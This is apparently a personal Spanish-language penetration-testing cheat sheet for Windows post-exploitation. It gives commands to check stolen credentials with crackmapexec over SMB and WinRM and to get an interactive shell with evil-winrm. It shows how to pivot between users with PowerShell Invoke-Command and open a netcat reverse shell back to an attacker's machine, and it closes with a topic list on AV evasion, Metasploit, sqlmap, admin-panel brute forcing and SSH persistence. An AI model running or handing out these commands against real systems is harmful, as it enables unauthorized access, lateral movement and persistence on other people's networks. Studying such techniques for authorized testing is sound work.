# Revisar si las credenciales obtenidas son validas 
crackmapexec smb xxx.xxx.xxx.xxx -u 'username' -p 'password'
# Si en la respuesta hay un [+] quiere decir que son validas

# Revisar si el usario forma parte del remote management users de Windows
crackmapexec winrm xxx.xxx.xxx.xxx -u 'username' -p 'password'
# Si en la repsuesta hay un Pwn3d! nos podemos conectar con evil-winrm y obtener una consola interactiva 

#Obtener una consola interactiva en la maquina victima con evil-winrm
evil-winrm -i xxx.xxx.xxx.xxx -u 'username' -p 'password'


# ----- User Pivoting teniendo credenciales -----
# Usando Invoke-Command y scriptblocks a traves de Powershell
#Abrir consola de powershell
powershell
>$user = dominio.local\username2
>$password = ConverTo-SecureString 'Password2' -AsPlainText -Force  (La vsariable password siempre hay que darlo de alta como secure string)
#Definir una nueva credencial de windows
$cred = New-Object System.Management.Automation.PSCredential($user, $password)
#ejecutar el comando como el usario2 con Invoke-Command y Scriptblock
Invoke-Command -ComputerName DC -Credential $cred -Scriptblock { whoami }
#Con este metodo puedo ponerme en escucha en la maquina atacante
#y ejecutar un cmd con netcat para tener una reverse shell con el nuevo usario
Invoke-Command -ComputerName DC -Credential $cred -Scriptblock { c:\Temp\netcat.exe -e cdm xxx.xxx.xxx.xxx Puerto }


# Ejecucion de POCs o exploits
- Searchsploit
- Defense Evasion
    + AV Detection Methods
    + AV Evasion Technics
- Metasploit
- SQL injection
    + Sqlmap
- Fuerza bruta panel de administración (Scripts Python|)

# ----- Conexion Permanete -----
- Conexión SSH con authorized keys
